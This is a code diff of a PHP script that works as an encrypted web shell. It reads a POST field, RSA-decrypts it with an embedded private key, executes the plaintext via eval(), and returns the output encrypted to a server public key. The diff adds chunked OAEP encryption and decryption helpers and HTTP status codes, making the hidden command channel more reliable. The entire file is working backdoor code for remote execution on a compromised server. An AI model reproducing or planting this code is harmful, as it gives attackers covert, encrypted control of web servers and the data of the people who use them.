@@ -68,25 +68,81 @@ Ctz2AvAcTZo06u7VUVu754GTGArTeNMX29sTuH/sXd532S/3eIQn75jIep8E7lQO
 tLU2ruUH6t15puLHgCZBOG8CAwEAAQ==
 -----END PUBLIC KEY-----';
 
-if(!isset($_POST[POST_KEY])) {
+if (!isset($_POST[POST_KEY])) {
+    header('HTTP/1.1 400 Bad Request');
     die('Invalid request');
 }
 
-$encryptedData = base64_decode($_POST[POST_KEY]);
+$encryptedData = $_POST[POST_KEY];
 $priKey = openssl_pkey_get_private($client_key);
 
 if (!$priKey) {
+    header('HTTP/1.1 500 Internal Server Error');
     die('loading private key failed');
 }
 
-if (!openssl_private_decrypt($encryptedData, $decrypted, $priKey)) {
+if (!$decrypted = ssl_decrypt($encryptedData, $priKey)) {
+    header('HTTP/1.1 500 Internal Server Error');
     die('decrypt failed');
 }
 
 $eval_return = eval($decrypted);
 
-openssl_public_encrypt($eval_return, $encrypted, $server_pub);
+$encrypted = ssl_encrypt($eval_return, $server_pub);
 
-$encrypted_base64 = base64_encode($encrypted);
+echo $encrypted;
 
-echo $encrypted_base64;
+
+function ssl_encrypt($source, $pem)
+{
+    $bits = ssl_getbits($pem);
+    $encrypted = '';
+    $cursor = 0;
+    $blocksize = $bits / 8 - 42;
+
+    while ($data = substr($source, $cursor, $blocksize)) {
+        set_time_limit(10);
+        error_clear_last();
+        openssl_public_encrypt($data, $blockdata, $pem, OPENSSL_PKCS1_OAEP_PADDING);
+        if (!empty(error_get_last())) {
+            return false;
+        }
+        $encrypted .= $blockdata;
+        $cursor += $blocksize;
+    }
+
+    return base64_encode($encrypted);
+}
+
+function ssl_decrypt($source, $pem)
+{
+    $source = base64_decode($source);
+    $bits = ssl_getbits($pem);
+    $decrypted = '';
+    $cursor = 0;
+    $blocksize = $bits / 8;
+
+    while ($data = substr($source, $cursor, $blocksize)) {
+        set_time_limit(10);
+        error_clear_last();
+        openssl_private_decrypt($data, $blockdata, $pem, OPENSSL_PKCS1_OAEP_PADDING);
+        if (!empty(error_get_last())) {
+            return false;
+        }
+        $decrypted .= $blockdata;
+        $cursor += $blocksize;
+    }
+
+    return $decrypted;
+}
+
+function ssl_getbits($pem)
+{
+    $key = openssl_pkey_get_public($pem);
+    if (is_resource($key)) {
+        $keyinfo = (object) openssl_pkey_get_details($key);
+        return $keyinfo->bits;
+    }
+
+    return false;
+}
